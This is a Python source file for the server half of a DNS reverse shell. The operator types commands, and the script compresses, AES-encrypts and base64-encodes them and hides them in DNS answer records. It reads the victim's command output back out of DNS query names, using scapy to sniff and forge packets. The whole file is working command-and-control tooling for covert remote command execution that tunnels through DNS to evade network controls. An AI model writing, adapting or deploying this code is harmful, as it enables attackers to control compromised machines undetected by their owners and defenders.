#!/usr/bin/env python3
from warnings import filterwarnings
filterwarnings("ignore")

from scapy.all import IP, UDP, DNS, DNSRR, send, sniff
from base64 import b64encode, b64decode
from Crypto.Cipher import AES

import threading
import argparse
import zlib
import hashlib
import signal
import os


def ctrl_c_handler(signal, frame):
    print("\nServer Stopped")
    os._exit(0)


signal.signal(signal.SIGINT, ctrl_c_handler)

parser = argparse.ArgumentParser(description="DNS Reverse Shell Server")
parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
parser.add_argument('-i',
                    '--interface',
                    action='store',
                    type=str,
                    help='Interface to use',
                    default='eth0')
parser.add_argument('-k', '--key', action='store', type=str, help='Password to use', required=True)

args = parser.parse_args()

IFACE = args.interface
DOMAIN = args.domain
KEY = hashlib.sha256(args.key.encode()).digest()

FRAG_LEN = 70 - len(DOMAIN)

lock = False

recv = b""  # Buffer of received data to process
queue = []  # List of commands to run
buf = []  # Break commands to send into smaller fragmented pieces


def reply(pkt, data=False) -> None:
    global buf
    # Construct the IP header
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    # Consturct the UDP header
    udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)

    # Check if data is pulse or not
    if data is False:
        data = pkt[DNS].qd.qname

    # Mark as last packet
    z = 0
    if buf == []:
        z = 1

    # Construct the DNS header
    dns = DNS(id=pkt[DNS].id,
              qd=pkt[DNS].qd,
              aa=1,
              qr=1,
              z=z,
              an=DNSRR(rrname=data, type='A', ttl=600))

    # Send the data
    send(ip / udp / dns, iface=IFACE, verbose=False)


# Encrypt data
def encrypt(raw: bytes) -> bytes:

    def _pad(s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) %
                                                                    AES.block_size).encode()

    cipher = AES.new(KEY, AES.MODE_CBC)
    return cipher.iv + cipher.encrypt(_pad(raw))


# Decrypt data
def decrypt(enc: bytes) -> bytes:

    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]

    iv = enc[:AES.block_size]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return _unpad(cipher.decrypt(enc[AES.block_size:]))


# Encodes into base64 and fragments data into smaller pieces
def encode(data: bytes) -> list:
    data = data.strip()
    data = zlib.compress(data)
    data = encrypt(data)
    e_data = b64encode(data).decode()
    frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
    return frag_e_data


# Decode base64
def decode(data: bytes) -> str:
    data = b64decode(data)
    data = decrypt(data)
    data = zlib.decompress(data)
    return data.decode()


# Handle packets that come in
def pkt_callback(pkt) -> None:
    global lock
    global queue
    global recv
    global buf

    # Extract data from client
    data = pkt.qd.qname.split(f".{DOMAIN}".encode())[0]

    # Check if is pulse or reply
    if data != b"pulse":
        recv += data

        # Check if last packet
        if pkt[DNS].z == 1:
            try:
                print(decode(recv))
            except:
                # UDP may lose data, oh wells...
                print("Data got corrupted!")
            finally:
                lock = False
            recv = b""

        reply(pkt)
    else:
        # Fragment the commands to be sent if it's too long
        if buf == [] and queue != []:
            buf = encode(queue.pop(0))

        if buf != []:  # Check if there are any more commands left to send
            reply(pkt, buf.pop(0) + f".{DOMAIN}")
        else:  # Continue with pulse
            reply(pkt)


# Handle user input
def user_input():
    global lock
    while True:
        if not lock:
            queue.append(input("> ").encode())
            lock = True


def main():
    print("Server started!")
    threading.Thread(target=user_input).start()

    # Sniff dns packets
    sniff(iface=IFACE, prn=pkt_callback, filter="udp dst port 53 and udp[10] & 0x80 = 0", store=0)


if __name__ == "__main__":
    main()
